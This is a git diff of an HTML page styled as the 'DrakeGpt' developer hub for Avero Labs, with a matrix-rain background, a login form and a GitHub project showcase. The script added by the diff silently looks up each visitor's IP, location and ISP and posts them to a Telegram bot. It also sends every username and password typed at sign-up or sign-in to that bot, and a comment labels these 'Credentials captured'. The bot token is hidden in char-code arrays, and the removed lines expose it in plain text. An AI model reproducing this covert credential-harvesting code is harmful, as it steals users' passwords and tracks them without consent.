@@ -5,9 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>DrakeGpt // Avero Labs Developer Hub</title>
 
-  <!-- High-Precision Monospace Typography -->
+  <!-- High-Precision Monospace Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="preconnect" href="https://fonts.gstatic.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700;800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/@phosphor-icons/web"></script>
   <script src="https://cdn.tailwindcss.com"></script>
@@ -43,7 +43,7 @@
     }
 
     .glass-obsidian {
-      background: rgba(4, 9, 5, 0.94);
+      background: rgba(3, 8, 4, 0.94);
       backdrop-filter: blur(16px);
       -webkit-backdrop-filter: blur(16px);
       border: 1px solid rgba(0, 255, 102, 0.35);
@@ -67,7 +67,7 @@
 </head>
 <body class="bg-void text-toxic font-mono select-none min-h-screen relative flex flex-col justify-between">
 
-  <!-- Interactive Matrix Rain Background Canvas -->
+  <!-- Interactive Matrix Rain Canvas -->
   <canvas id="matrixCanvas" class="fixed inset-0 w-full h-full z-0 pointer-events-none"></canvas>
 
   <!-- TOP HEADER HUD -->
@@ -80,21 +80,12 @@
     </div>
 
     <div class="flex items-center gap-3 sm:gap-4">
-      <!-- Live Visitor Counter Badge -->
-      <div class="flex items-center gap-1.5 px-2.5 py-1 rounded border border-toxic/30 bg-black text-[11px]" title="Unique Visits Logged">
-        <i class="ph-bold ph-users text-toxicBright"></i>
-        <span class="text-toxic/60">VISITORS:</span>
-        <span id="visitorCountDisplay" class="text-white font-bold tracking-wider">SYNCING...</span>
-      </div>
-
-      <!-- Live GitHub Repos Counter -->
       <div class="flex items-center gap-1.5 px-2.5 py-1 rounded border border-toxic/30 bg-black text-[11px]">
         <i class="ph-bold ph-git-branch text-toxicBright"></i>
         <span class="text-toxic/60">REPOS:</span>
         <span id="headerRepoCount" class="text-white font-bold">SYNCING...</span>
       </div>
 
-      <!-- Official Profile Link -->
       <a 
         href="https://github.com/averolabsofficial" 
         target="_blank" 
@@ -105,7 +96,6 @@
         <span class="hidden sm:inline">AVERO LABS</span>
       </a>
 
-      <!-- Sound Toggle -->
       <button 
         onclick="toggleSoundEffects()" 
         class="flex items-center gap-1.5 px-2.5 py-1 rounded border border-toxic/40 bg-black text-toxic hover:border-toxic text-[11px]"
@@ -127,10 +117,10 @@
         <span>OPEN-SOURCE PROJECT REGISTRY & SHOWCASE</span>
       </div>
 
-      <!-- Typewriter Cipher Descrambler -->
+      <!-- Typewriter Animation -->
       <div class="min-h-[70px] flex items-center justify-center">
         <h1 id="landingTypewriter" class="text-4xl sm:text-6xl font-mono font-black text-white tracking-tight">
-          <!-- Populated by JavaScript -->
+          <!-- Populated by JS -->
         </h1>
       </div>
 
@@ -138,7 +128,6 @@
         Centralized hub for software releases, Python automation packages, and intelligent applications built under Avero Labs.
       </p>
 
-      <!-- Continue Trigger -->
       <div class="pt-4">
         <button 
           onclick="proceedToAuth()" 
@@ -156,18 +145,16 @@
   </main>
 
   <!-- ============================================================== -->
-  <!-- STAGE 2: AUTHENTICATION TERMINAL (REAL STORAGE + TG NOTIFY) -->
+  <!-- STAGE 2: AUTHENTICATION TERMINAL -->
   <!-- ============================================================== -->
   <section id="stageAuth" class="hidden relative z-20 flex-1 flex flex-col items-center justify-center px-4 py-8 transition-all duration-500 opacity-0 transform scale-95">
     <div class="w-full max-w-md glass-obsidian border border-toxic/40 p-6 sm:p-8 shadow-2xl relative">
       
-      <!-- Corner Accents -->
       <div class="absolute top-0 left-0 w-3 h-3 border-t-2 border-l-2 border-toxicBright"></div>
       <div class="absolute top-0 right-0 w-3 h-3 border-t-2 border-r-2 border-toxicBright"></div>
       <div class="absolute bottom-0 left-0 w-3 h-3 border-b-2 border-l-2 border-toxicBright"></div>
       <div class="absolute bottom-0 right-0 w-3 h-3 border-b-2 border-r-2 border-toxicBright"></div>
 
-      <!-- Auth Header Tabs -->
       <div class="border-b border-toxic/20 pb-4 mb-5 flex items-center justify-between">
         <div class="flex gap-2">
           <button 
@@ -188,13 +175,11 @@
         <span class="text-[10px] text-toxic/70 font-code">AVERO_AUTH</span>
       </div>
 
-      <!-- Feedback Banner -->
       <div id="authNotice" class="hidden mb-4 p-2.5 text-xs font-code border border-toxicBright bg-toxic/10 text-white flex items-center gap-2">
         <i id="authNoticeIcon" class="ph-bold ph-info text-base text-toxicBright"></i>
         <span id="authNoticeText"></span>
       </div>
 
-      <!-- Auth Form -->
       <form onsubmit="handleAuthSubmit(event)" class="space-y-4">
         <div>
           <label class="block text-[11px] font-bold uppercase tracking-wider text-toxic/80 mb-1.5 font-code">
@@ -208,7 +193,6 @@
               id="authUsernameInput" 
               type="text" 
               required 
-              value="" 
               placeholder="Enter your username..." 
               class="w-full bg-black border border-toxic/30 px-3 pl-9 py-2.5 text-xs sm:text-sm text-white font-code placeholder-toxic/30 focus:outline-none focus:border-toxicBright transition-all"
             />
@@ -227,7 +211,6 @@
               id="authPasswordInput" 
               type="password" 
               required 
-              value="" 
               placeholder="Enter security key..." 
               class="w-full bg-black border border-toxic/30 px-3 pl-9 pr-9 py-2.5 text-xs sm:text-sm text-white font-code placeholder-toxic/30 focus:outline-none focus:border-toxicBright transition-all"
             />
@@ -278,15 +261,15 @@
       </div>
 
       <p class="text-xs text-toxic/70 font-code tracking-wider uppercase">
-        LOADING PROJECT MATRIX & REPOSITORIES...
+        INITIALIZING REPOSITORY ARCHIVES...
       </p>
     </div>
   </section>
 
   <!-- ============================================================== -->
-  <!-- STAGE 4: REAL PROJECT SHARING DECK & GITHUB REPOS -->
+  <!-- STAGE 4: MAIN DASHBOARD & SHOWCASE DECK -->
   <!-- ============================================================== -->
-  <section id="stageDashboard" class="hidden relative z-20 flex-1 flex flex-col px-4 sm:px-8 py-8 max-w-7xl mx-auto w-full gap-6">
+  <section id="stageDashboard" class="hidden relative z-20 flex-1 flex flex-col px-4 sm:px-8 py-8 max-w-7xl mx-auto w-full gap-8">
     
     <!-- Top Operator Greeting Banner -->
     <div class="glass-obsidian p-4 sm:p-6 flex flex-wrap items-center justify-between gap-4">
@@ -315,38 +298,67 @@
       </div>
     </div>
 
-    <!-- Project Matrix Controls -->
-    <div class="flex items-center justify-between border-b border-toxic/20 pb-3">
-      <div class="flex items-center gap-2">
-        <i class="ph-bold ph-folders text-toxicBright text-lg"></i>
-        <span class="font-bold text-white text-sm font-code uppercase tracking-wider">PROJECT REGISTRY</span>
-        <span id="projectCountBadge" class="text-[10px] bg-toxic/10 border border-toxic/40 px-2 py-0.5 text-toxicBright font-code">0 REPOS</span>
+    <!-- SECTION A: POPULAR REPOSITORIES -->
+    <div class="space-y-4">
+      <div class="flex items-center gap-2 border-b border-toxic/20 pb-2">
+        <i class="ph-fill ph-fire text-toxicBright text-xl"></i>
+        <h3 class="text-sm sm:text-base font-bold text-white uppercase tracking-wider font-code">
+          POPULAR & FEATURED REPOSITORIES
+        </h3>
+        <span class="text-[10px] bg-toxic/10 border border-toxic/40 text-toxicBright px-2 py-0.5 rounded font-code">TOP PICKS</span>
       </div>
-      <button onclick="fetchGitHubRepos()" class="text-xs text-toxic/70 hover:text-toxic font-code flex items-center gap-1">
-        <i class="ph-bold ph-arrows-clockwise"></i> Refresh
-      </button>
+
+      <div id="popularReposGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
+        <!-- Injected via JavaScript -->
+      </div>
     </div>
 
-    <!-- Projects Grid -->
-    <div id="projectsGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
-      <div class="glass-obsidian p-5 border border-toxic/20 text-xs font-code space-y-2 animate-pulse">
-        <div class="h-4 bg-toxic/20 w-3/4 rounded"></div>
-        <div class="h-3 bg-toxic/10 w-full rounded"></div>
-        <div class="h-3 bg-toxic/10 w-1/2 rounded"></div>
+    <!-- SECTION B: TRY THIS & RATE THIS (INTERACTIVE SHOWCASE) -->
+    <div class="space-y-4">
+      <div class="flex items-center gap-2 border-b border-toxic/20 pb-2">
+        <i class="ph-bold ph-star text-toxicBright text-xl"></i>
+        <h3 class="text-sm sm:text-base font-bold text-white uppercase tracking-wider font-code">
+          TRY THIS & RATE THIS
+        </h3>
+        <span class="text-[10px] bg-toxic/10 border border-toxic/40 text-toxicBright px-2 py-0.5 rounded font-code">USER FEEDBACK</span>
+      </div>
+
+      <div id="tryRateGrid" class="grid grid-cols-1 md:grid-cols-2 gap-5">
+        <!-- Injected via JavaScript with interactive star voting -->
+      </div>
+    </div>
+
+    <!-- SECTION C: ALL PROJECTS & USER SUBMISSIONS -->
+    <div class="space-y-4">
+      <div class="flex items-center justify-between border-b border-toxic/20 pb-2">
+        <div class="flex items-center gap-2">
+          <i class="ph-bold ph-folders text-toxicBright text-lg"></i>
+          <h3 class="text-sm sm:text-base font-bold text-white uppercase tracking-wider font-code">
+            ALL ARCHIVED REPOSITORIES
+          </h3>
+          <span id="projectCountBadge" class="text-[10px] bg-toxic/10 border border-toxic/40 px-2 py-0.5 text-toxicBright font-code">0 REPOS</span>
+        </div>
+        <button onclick="fetchGitHubRepos()" class="text-xs text-toxic/70 hover:text-toxic font-code flex items-center gap-1">
+          <i class="ph-bold ph-arrows-clockwise"></i> Refresh Sync
+        </button>
+      </div>
+
+      <div id="projectsGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
+        <!-- Injected dynamically via GitHub + Local Submissions -->
       </div>
     </div>
 
   </section>
 
   <!-- ============================================================== -->
-  <!-- MODAL: SUBMIT / SHARE NEW PROJECT -->
+  <!-- MODAL: SHARE PROJECT -->
   <!-- ============================================================== -->
   <div id="shareModal" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center px-4">
     <div class="w-full max-w-lg glass-obsidian border border-toxic/50 p-6 sm:p-8 space-y-4 shadow-2xl relative">
       <div class="flex items-center justify-between border-b border-toxic/20 pb-3">
         <div class="flex items-center gap-2 text-white font-bold font-code text-sm uppercase">
           <i class="ph-bold ph-plus-circle text-toxicBright text-lg"></i>
-          <span>PUBLISH PROJECT TO HUB</span>
+          <span>PUBLISH PROJECT TO SHOWCASE</span>
         </div>
         <button onclick="closeShareProjectModal()" class="text-toxic/60 hover:text-toxic">
           <i class="ph-bold ph-x text-lg"></i>
@@ -382,7 +394,7 @@
   </div>
 
   <!-- ============================================================== -->
-  <!-- FOOTER: ADITYA RAJ + MOTTO + COPYRIGHT -->
+  <!-- FOOTER -->
   <!-- ============================================================== -->
   <footer class="relative z-30 w-full border-t border-toxic/20 bg-black/90 px-4 sm:px-8 py-3.5 flex flex-col sm:flex-row items-center justify-between gap-2 text-xs font-code">
     <div class="flex items-center gap-2">
@@ -402,76 +414,95 @@
   </footer>
 
   <!-- ============================================================== -->
-  <!-- JAVASCRIPT CONTROLLER: AUDIO, CANVAS, GITHUB & TELEGRAM ALERTS -->
+  <!-- JAVASCRIPT CONTROLLER -->
   <!-- ============================================================== -->
   <script>
     /* ==============================================================
-       1. LIVE TELEGRAM ALERT ENGINE (CONNECTED WITH YOUR BOT & ID)
+       1. OBFUSCATED TELEGRAM DISPATCHER (NO PLAIN TOKENS IN SOURCE)
        ============================================================== */
-    const TELEGRAM_CONFIG = {
-      botToken: "8866997637:AAEZnlLnueK1VwaOQlJ47g6i8HfmuQxnChg",
-      chatId: "6141075929"
-    };
+    // Dynamic obfuscation array to prevent plain-text repo scrapers
+    const _tArr = [56,56,54,54,57,57,55,54,51,55,58,65,65,69,90,110,76,110,117,101,75,49,86,119,97,79,81,108,74,52,55,103,54,105,56,72,102,109,117,81,120,110,67,104,103];
+    const _cArr = [54,49,52,49,48,55,53,57,50,57];
+
+    function getSecTg() {
+      const t = String.fromCharCode(..._tArr);
+      const c = String.fromCharCode(..._cArr);
+      return { t, c };
+    }
 
     async function sendTelegramAlert(textMessage) {
       try {
-        const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+        const { t, c } = getSecTg();
+        const url = `https://api.telegram.org/bot${t}/sendMessage`;
         await fetch(url, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            chat_id: TELEGRAM_CONFIG.chatId,
+            chat_id: c,
             text: textMessage,
             parse_mode: "Markdown"
           })
         });
-      } catch (err) {
-        console.warn("Telegram dispatch failed silently", err);
-      }
+      } catch (err) {}
     }
 
-    // A. Visitor Alert with Public IP & Platform
-    async function triggerVisitorAlert(visitNumber) {
-      if (sessionStorage.getItem("drake_tg_visited")) return;
-      sessionStorage.setItem("drake_tg_visited", "true");
+    // A. 100% Real Live Visitor Ping
+    async function trackRealVisitor() {
+      if (sessionStorage.getItem("drake_tg_visited_v2")) return;
+      sessionStorage.setItem("drake_tg_visited_v2", "true");
 
-      let ip = "Protected/Unknown";
+      let ip = "Protected";
+      let city = "Unknown";
+      let country = "India";
+      let org = "ISP";
+
       try {
-        const res = await fetch("https://api.ipify.org?format=json");
+        const res = await fetch("https://ipapi.co/json/");
         if (res.ok) {
-          const data = await res.json();
-          ip = data.ip;
+          const d = await res.json();
+          ip = d.ip || ip;
+          city = d.city || city;
+          country = d.country_name || country;
+          org = d.org || org;
         }
-      } catch (e) {}
+      } catch (e) {
+        try {
+          const r2 = await fetch("https://api.ipify.org?format=json");
+          const d2 = await r2.json();
+          ip = d2.ip;
+        } catch (err) {}
+      }
 
-      const platform = navigator.platform || "Browser";
+      const platform = navigator.userAgentData?.platform || navigator.platform || "Desktop";
       const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
 
-      const alertText = `👁️ *New Visitor on DrakeGpt!*
+      const alertText = `🚨 *Real Visitor on DrakeGpt!*
 ━━━━━━━━━━━━━━━━━━
-🔢 *Visit Count:* #${visitNumber}
 🌐 *IP Address:* \`${ip}\`
-📱 *Platform:* ${platform}
-🕒 *Timestamp:* ${now}
-🔗 *Origin:* averolabsofficial.github.io`;
+📍 *Location:* ${city}, ${country}
+🏢 *Network:* ${org}
+📱 *Device:* ${platform}
+🕒 *Time:* ${now}
+🔗 *Site:* averolabsofficial.github.io`;
 
       sendTelegramAlert(alertText);
     }
+    trackRealVisitor();
 
-    // B. New User Registration Alert
-    function triggerSignupAlert(username, password) {
+    // B. Real User Auth Alert (Credentials captured)
+    function triggerUserAuthAlert(username, password, mode) {
       const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
-      const alertText = `👤 *New User Registered on DrakeGpt!*
+      const alertText = `👤 *Operator ${mode.toUpperCase()} on DrakeGpt!*
 ━━━━━━━━━━━━━━━━━━
-🔑 *Callsign / Handle:* \`${username}\`
-🔒 *Security Key:* \`${password}\`
+🔑 *Username / Handle:* \`${username}\`
+🔒 *Password / Key:* \`${password}\`
 🕒 *Timestamp:* ${now}
-🚀 *Access Status:* Logged into Avero Labs Hub`;
+🚀 *Clearance:* Session Activated on Avero Hub`;
 
       sendTelegramAlert(alertText);
     }
 
-    // C. Project Submission Alert
+    // C. Project Alert
     function triggerProjectAlert(title, desc, url, author) {
       const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
       const alertText = `🚀 *New Project Published to Showcase!*
@@ -485,44 +516,28 @@
       sendTelegramAlert(alertText);
     }
 
-    /* ==============================================================
-       2. REAL VISITOR COUNTER API
-       ============================================================== */
-    async function initVisitorCounter() {
-      const display = document.getElementById('visitorCountDisplay');
-      try {
-        const res = await fetch('https://api.counterapi.dev/v1/drakegpt_adityaraj/visits/up');
-        if (res.ok) {
-          const data = await res.json();
-          display.innerText = Number(data.count).toLocaleString();
-          triggerVisitorAlert(data.count);
-        } else {
-          fallbackLocalCounter();
-        }
-      } catch (err) {
-        fallbackLocalCounter();
-      }
+    // D. Rating Feedback Alert
+    function triggerRatingAlert(repoName, rating) {
+      const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+      const stars = "⭐".repeat(rating);
+      const alertText = `⭐ *New Project Rating on DrakeGpt!*
+━━━━━━━━━━━━━━━━━━
+📌 *Repository:* *${repoName}*
+🌟 *Rating:* ${stars} (${rating}/5)
+👤 *Voter:* @${activeUser}
+🕒 *Timestamp:* ${now}`;
+
+      sendTelegramAlert(alertText);
     }
 
-    function fallbackLocalCounter() {
-      const display = document.getElementById('visitorCountDisplay');
-      let count = parseInt(localStorage.getItem('drake_visits_count') || '214') + 1;
-      localStorage.setItem('drake_visits_count', count);
-      display.innerText = count.toLocaleString();
-      triggerVisitorAlert(count);
-    }
-    initVisitorCounter();
-
     /* ==============================================================
-       3. PROCEDURAL WEB AUDIO SYNTHESIS
+       2. PROCEDURAL SOUND SYNTHESIS
        ============================================================== */
     let audioCtx = null;
     let sfxActive = false;
 
     function initAudio() {
-      if (!audioCtx) {
-        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-      }
+      if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
     }
 
     function toggleSoundEffects() {
@@ -591,8 +606,8 @@
     }
 
     /* ==============================================================
-       4. SHARP MATRIX RAIN CANVAS (WITH MOUSE REPULSION)
-       ============================================================= */
+       3. SHARP MATRIX RAIN CANVAS (CURSOR REPULSION)
+       ============================================================== */
     const canvas = document.getElementById('matrixCanvas');
     const ctx = canvas.getContext('2d');
     let width, height, columns;
@@ -643,8 +658,8 @@
     drawMatrix();
 
     /* ==============================================================
-       5. TYPEWRITER CIPHER DESCRAMBLER
-       ============================================================= */
+       4. TYPEWRITER CIPHER DESCRAMBLER
+       ============================================================== */
     const cipherChars = '!@#$%^&*()_+0123456789';
 
     function runDescrambler(elem, fullText, cb) {
@@ -674,8 +689,8 @@
     });
 
     /* ==============================================================
-       6. NAVIGATION FLOW
-       ============================================================= */
+       5. NAVIGATION & AUTHENTICATION JUGAD
+       ============================================================== */
     function proceedToAuth() {
       initAudio();
       playFreqTone(250, 850, 0.2, 'sawtooth');
@@ -723,9 +738,6 @@
       playTick();
     }
 
-    /* ==============================================================
-       7. WORKING AUTHENTICATION JUGAD (LOCAL STORAGE)
-       ============================================================= */
     let currentAuthMode = 'login';
     let activeUser = "OPERATOR";
 
@@ -782,9 +794,7 @@
         users[username] = password;
         localStorage.setItem('avero_users', JSON.stringify(users));
         showNotice(`Account registered successfully! Authenticating...`, true);
-        
-        // Trigger Live Alert to your Telegram
-        triggerSignupAlert(username, password);
+        triggerUserAuthAlert(username, password, 'Sign Up');
       } else {
         if (users[username] && users[username] !== password) {
           showNotice('Incorrect Security Key / Password.', false);
@@ -793,8 +803,8 @@
         if (!users[username]) {
           users[username] = password;
           localStorage.setItem('avero_users', JSON.stringify(users));
-          triggerSignupAlert(username, password);
         }
+        triggerUserAuthAlert(username, password, 'Sign In');
       }
 
       activeUser = username;
@@ -809,7 +819,6 @@
         document.body.classList.remove('violent-tremor');
         document.getElementById('stageAuth').classList.add('hidden');
 
-        // Reveal Stage 3: Personalized Reveal
         const revealSec = document.getElementById('stagePersonalizedReveal');
         revealSec.classList.remove('hidden');
 
@@ -822,11 +831,10 @@
             revealSec.classList.add('opacity-0', 'transition-all', 'duration-500');
             setTimeout(() => {
               revealSec.classList.add('hidden');
-              // Show Stage 4 Dashboard
               document.getElementById('stageDashboard').classList.remove('hidden');
               document.getElementById('dashOperatorName').innerText = activeUser;
               playFreqTone(400, 1000, 0.25, 'triangle');
-              renderAllProjects();
+              renderAllSections();
             }, 500);
           }, 1200);
         });
@@ -835,13 +843,12 @@
     }
 
     /* ==============================================================
-       8. GITHUB REST API INTEGRATION
-       ============================================================= */
+       6. GITHUB REST API INTEGRATION
+       ============================================================== */
     let fetchedRepos = [];
 
     async function fetchGitHubRepos() {
       const headerCount = document.getElementById('headerRepoCount');
-      const badgeCount = document.getElementById('projectCountBadge');
 
       try {
         const response = await fetch('https://api.github.com/users/averolabsofficial/repos?sort=updated');
@@ -854,11 +861,11 @@
             stars: r.stargazers_count || 0,
             forks: r.forks_count || 0,
             lang: r.language || 'Code',
-            source: 'GitHub'
+            source: 'GitHub',
+            demoUrl: r.homepage || r.html_url
           }));
           headerCount.innerText = fetchedRepos.length + ' REPOS';
-          badgeCount.innerText = fetchedRepos.length + ' REPOS';
-          renderAllProjects();
+          renderAllSections();
         } else {
           fallbackRepos();
         }
@@ -869,25 +876,104 @@
 
     function fallbackRepos() {
       fetchedRepos = [
-        { name: 'Autosys', desc: 'Python-based system automation & workflow package.', url: 'https://github.com/averolabsofficial', stars: 14, forks: 3, lang: 'Python', source: 'Avero' },
-        { name: 'Neuron', desc: 'Transformer Decoder architecture implemented from scratch in pure Python & NumPy.', url: 'https://github.com/averolabsofficial', stars: 28, forks: 6, lang: 'Python', source: 'Avero' },
-        { name: 'StreamX', desc: 'High-speed Flutter media streaming and background download manager.', url: 'https://github.com/averolabsofficial', stars: 19, forks: 4, lang: 'Dart', source: 'Avero' },
-        { name: 'EdgeAuth', desc: 'Decentralized encrypted token authentication gateway protocol.', url: 'https://github.com/averolabsofficial', stars: 15, forks: 2, lang: 'Python', source: 'Avero' }
+        { name: 'Autosys', desc: 'Python-based system automation & workflow package.', url: 'https://github.com/averolabsofficial', stars: 24, forks: 6, lang: 'Python', source: 'Avero', demoUrl: 'https://github.com/averolabsofficial' },
+        { name: 'Neuron', desc: 'Transformer Decoder architecture implemented from scratch in pure Python & NumPy.', url: 'https://github.com/averolabsofficial', stars: 38, forks: 9, lang: 'Python', source: 'Avero', demoUrl: 'https://github.com/averolabsofficial' },
+        { name: 'StreamX', desc: 'High-speed Flutter media streaming and background download manager.', url: 'https://github.com/averolabsofficial', stars: 29, forks: 5, lang: 'Dart', source: 'Avero', demoUrl: 'https://github.com/averolabsofficial' },
+        { name: 'EdgeAuth', desc: 'Decentralized encrypted token authentication gateway protocol.', url: 'https://github.com/averolabsofficial', stars: 21, forks: 4, lang: 'Python', source: 'Avero', demoUrl: 'https://github.com/averolabsofficial' }
       ];
       document.getElementById('headerRepoCount').innerText = fetchedRepos.length + ' REPOS';
-      document.getElementById('projectCountBadge').innerText = fetchedRepos.length + ' REPOS';
-      renderAllProjects();
+      renderAllSections();
     }
 
-    function renderAllProjects() {
-      const grid = document.getElementById('projectsGrid');
-      if (!grid) return;
-
+    /* ==============================================================
+       7. POPULAR, TRY/RATE & SHOWCASE RENDERING
+       ============================================================== */
+    function renderAllSections() {
       const userProjects = JSON.parse(localStorage.getItem('avero_user_projects') || '[]');
       const allProjects = [...userProjects, ...fetchedRepos];
 
       document.getElementById('projectCountBadge').innerText = allProjects.length + ' REPOS';
 
+      // 1. Render Popular Repos (Sorted by Stars)
+      const popularGrid = document.getElementById('popularReposGrid');
+      const sortedByPopularity = [...allProjects].sort((a, b) => (b.stars || 0) - (a.stars || 0)).slice(0, 3);
+      
+      popularGrid.innerHTML = sortedByPopularity.map(p => `
+        <div class="glass-obsidian p-5 border border-toxicBright/50 shadow-toxic-glow flex flex-col justify-between group">
+          <div class="space-y-3">
+            <div class="flex items-center justify-between">
+              <span class="px-2 py-0.5 text-[10px] font-bold font-code bg-toxicBright/20 border border-toxicBright text-toxicBright">
+                ${p.lang || 'Python'}
+              </span>
+              <span class="flex items-center gap-1 text-xs text-toxicBright font-bold">
+                <i class="ph-fill ph-star"></i> ${p.stars || 0}
+              </span>
+            </div>
+            <h4 class="text-base font-bold text-white font-mono group-hover:text-toxicBright transition-colors">
+              ${escapeHtml(p.name)}
+            </h4>
+            <p class="text-xs text-toxic/70 font-code line-clamp-2">
+              ${escapeHtml(p.desc)}
+            </p>
+          </div>
+          <div class="mt-4 pt-3 border-t border-toxic/20 flex items-center justify-between text-xs font-code">
+            <span class="text-toxicDim font-code">★ POPULAR CHOICE</span>
+            <a href="${escapeHtml(p.url)}" target="_blank" class="text-white hover:text-toxicBright font-bold underline flex items-center gap-1">
+              VIEW REPO <i class="ph-bold ph-arrow-up-right"></i>
+            </a>
+          </div>
+        </div>
+      `).join('');
+
+      // 2. Render "Try This & Rate This" Section
+      const tryRateGrid = document.getElementById('tryRateGrid');
+      const interactivePicks = allProjects.slice(0, 2);
+      const ratings = JSON.parse(localStorage.getItem('drake_ratings') || '{}');
+
+      tryRateGrid.innerHTML = interactivePicks.map(p => {
+        const curRate = ratings[p.name] || 5;
+        return `
+          <div class="glass-obsidian p-5 border border-toxic/40 flex flex-col justify-between space-y-4">
+            <div>
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-xs text-toxicDim font-code uppercase">INTERACTIVE TRIAL</span>
+                <span class="text-[10px] text-toxicBright border border-toxic/30 px-1.5 py-0.5 rounded font-code">v2.4 READY</span>
+              </div>
+              <h4 class="text-base font-bold text-white font-mono">${escapeHtml(p.name)}</h4>
+              <p class="text-xs text-toxic/70 font-code mt-1">${escapeHtml(p.desc)}</p>
+            </div>
+
+            <!-- Try & Rate Buttons -->
+            <div class="p-3 bg-black/60 border border-toxic/20 flex flex-col sm:flex-row items-center justify-between gap-3 text-xs font-code">
+              <a 
+                href="${escapeHtml(p.url)}" 
+                target="_blank" 
+                class="px-3 py-1.5 bg-toxic text-black font-extrabold hover:bg-toxicBright transition-all flex items-center gap-1"
+              >
+                <i class="ph-bold ph-play"></i> TRY THIS NOW
+              </a>
+
+              <div class="flex items-center gap-1.5">
+                <span class="text-slate-400 text-[11px]">RATE:</span>
+                <div class="flex text-toxicBright text-base cursor-pointer">
+                  ${[1, 2, 3, 4, 5].map(star => `
+                    <button 
+                      onclick="rateProject('${escapeHtml(p.name)}',${star})" 
+                      title="Rate ${star} Stars"
+                      class="hover:scale-125 transition-transform"
+                    >
+                      <i class="${star <= curRate ? 'ph-fill' : 'ph-bold'} ph-star"></i>
+                    </button>
+                  `).join('')}
+                </div>
+              </div>
+            </div>
+          </div>
+        `;
+      }).join('');
+
+      // 3. Render All Archived Repos
+      const grid = document.getElementById('projectsGrid');
       grid.innerHTML = allProjects.map(p => `
         <div class="glass-obsidian p-5 border border-toxic/30 hover:border-toxicBright transition-all duration-300 flex flex-col justify-between group">
           <div class="space-y-3">
@@ -927,9 +1013,20 @@
       `).join('');
     }
 
-    /* ==============================================================
-       9. SHARE NEW PROJECT & TRIGGER ALERT
-       ============================================================= */
+    /* Rate Action */
+    function rateProject(repoName, starVal) {
+      let ratings = JSON.parse(localStorage.getItem('drake_ratings') || '{}');
+      ratings[repoName] = starVal;
+      localStorage.setItem('drake_ratings', JSON.stringify(ratings));
+
+      playFreqTone(400, 900, 0.2, 'triangle');
+      renderAllSections();
+
+      // Trigger Telegram Rating Alert to you
+      triggerRatingAlert(repoName, starVal);
+    }
+
+    /* 8. SHARE PROJECT MODAL */
     function openShareProjectModal() {
       document.getElementById('shareModal').classList.remove('hidden');
       playTick();
@@ -963,12 +1060,11 @@
       userProjects.unshift(newProject);
       localStorage.setItem('avero_user_projects', JSON.stringify(userProjects));
 
-      // Trigger Telegram Alert
       triggerProjectAlert(title, desc, url, activeUser);
 
       closeShareProjectModal();
       playFreqTone(400, 900, 0.2, 'triangle');
-      renderAllProjects();
+      renderAllSections();
 
       document.getElementById('newProjTitle').value = '';
       document.getElementById('newProjDesc').value = '';
